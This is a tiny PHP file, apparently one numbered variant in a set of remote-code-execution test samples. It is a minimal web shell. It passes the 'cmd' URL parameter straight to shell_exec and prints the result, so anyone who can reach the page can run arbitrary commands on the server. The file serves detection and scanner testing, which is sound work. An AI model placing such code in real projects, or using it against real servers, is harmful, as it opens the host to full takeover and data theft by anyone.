<?php
// RCE test variation #1232
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>